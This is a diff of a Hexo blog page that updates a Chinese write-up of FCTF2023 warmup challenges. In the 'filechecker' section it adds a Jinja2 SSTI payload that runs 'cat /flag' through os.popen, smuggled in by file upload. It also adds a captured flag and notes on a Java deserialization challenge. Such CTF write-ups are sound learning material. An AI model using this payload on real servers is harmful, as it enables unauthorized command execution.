@@ -64,6 +64,50 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-warmup" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/04/28/warmup/" class="article-date">
+  <time datetime="2023-04-28T08:08:35.000Z" itemprop="datePublished">2023-04-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/04/28/warmup/">2023/04/18：FCTF2023：warmup&amp;正式比赛</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>无所谓会不会，主要是图一乐<br>又菜又爱玩才能进步</p>
+<h4 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h4><h5 id="viewsource"><a href="#viewsource" class="headerlink" title="viewsource"></a>viewsource</h5><p>没啥好说的，F12</p>
+<h5 id="filechecker"><a href="#filechecker" class="headerlink" title="filechecker"></a>filechecker</h5><p>先再次复习下再继续</p>
+<img src="/2023/04/28/warmup/az.png" class="">
+<p>啊这（<br>找了网上的payload，这题先随便传个图片上去，然后把那些二进制的内容删掉改成</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="comment">#! &#123;&#123;lipsum.__globals__.os.popen(&quot;cat /flag&quot;).read()&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>这题应该是借文件上传利用SSTI获得flag，写的时候一直想怎么注入cat flag命令结果是这样的方式，多刷吧还是没办法马上反应过来(想着怎么利用bin那句命令结果忘了之前的SSIT了emm)<br>FCTF{realflag_5vycRgpY1Ekhrdk5wLcJoynj3QOH2JUoUfbCG0he}</p>
+<h5 id="javadeserialize"><a href="#javadeserialize" class="headerlink" title="javadeserialize"></a>javadeserialize</h5><p>emm这个折腾的有点久有点问题<br>——————————————————————————<br>捋一捋IDEA的使用，好像哪里不大对<br>在IDEA的使用上折腾有点久，最开始时一直报错，至少现在能打开了能运行了（ 还在调试题目的源文件，复制黏贴时文件有点问题，复制的文件不是“可执行类”，没法达到想要的效果，单纯的复制文件不会被真正导入，再慢慢找问题。可能忘记改pom?<br>——————————————————————————<br>最开始用IDEA时手忙脚乱，似乎把题目文件结构破坏了，尝试了很多次，初次IDEA不熟悉它的工作方式犯了不少低级错误，甚至忘了Maven,因为添加目录为库时没操作好让程序报错，还以为又是自己把文件损坏了（</p>
+<h4 id="正式赛"><a href="#正式赛" class="headerlink" title="正式赛"></a>正式赛</h4>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/04/28/warmup/" data-id="clgmd2nz000012oud7h4f1jo9" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-aaaa" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2023/04/27/aaaa/" class="article-date">
@@ -112,48 +156,6 @@
     </div>
     <footer class="article-footer">
       <a data-url="http://example.com/2023/04/27/aaaa/" data-id="clgmd2nyv00002oud4yao5c83" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-warmup" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/04/27/warmup/" class="article-date">
-  <time datetime="2023-04-27T08:08:35.000Z" itemprop="datePublished">2023-04-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/04/27/warmup/">2023/04/18：FCTF2023：warmup&amp;正式比赛</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>无所谓会不会，主要是图一乐<br>又菜又爱玩才能进步</p>
-<h4 id="warm-up"><a href="#warm-up" class="headerlink" title="warm up"></a>warm up</h4><h5 id="viewsource"><a href="#viewsource" class="headerlink" title="viewsource"></a>viewsource</h5><p>没啥好说的，F12</p>
-<h5 id="filechecker"><a href="#filechecker" class="headerlink" title="filechecker"></a>filechecker</h5><p>先再次复习下再继续</p>
-<img src="/2023/04/27/warmup/az.png" class="">
-<p>啊这（</p>
-<h5 id="javadeserialize"><a href="#javadeserialize" class="headerlink" title="javadeserialize"></a>javadeserialize</h5><p>emm这个折腾的有点久有点问题，先看完别的吧</p>
-<h4 id="正式赛"><a href="#正式赛" class="headerlink" title="正式赛"></a>正式赛</h4>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2023/04/27/warmup/" data-id="clgmd2nz000012oud7h4f1jo9" class="article-share-link">Share</a>
       
       
     </footer>
@@ -506,11 +508,11 @@
       <ul>
         
           <li>
-            <a href="/2023/04/27/aaaa/">2023/04/15：burplabs从0开始</a>
+            <a href="/2023/04/28/warmup/">2023/04/18：FCTF2023：warmup&amp;正式比赛</a>
           </li>
         
           <li>
-            <a href="/2023/04/27/warmup/">2023/04/18：FCTF2023：warmup&amp;正式比赛</a>
+            <a href="/2023/04/27/aaaa/">2023/04/15：burplabs从0开始</a>
           </li>
         
           <li>
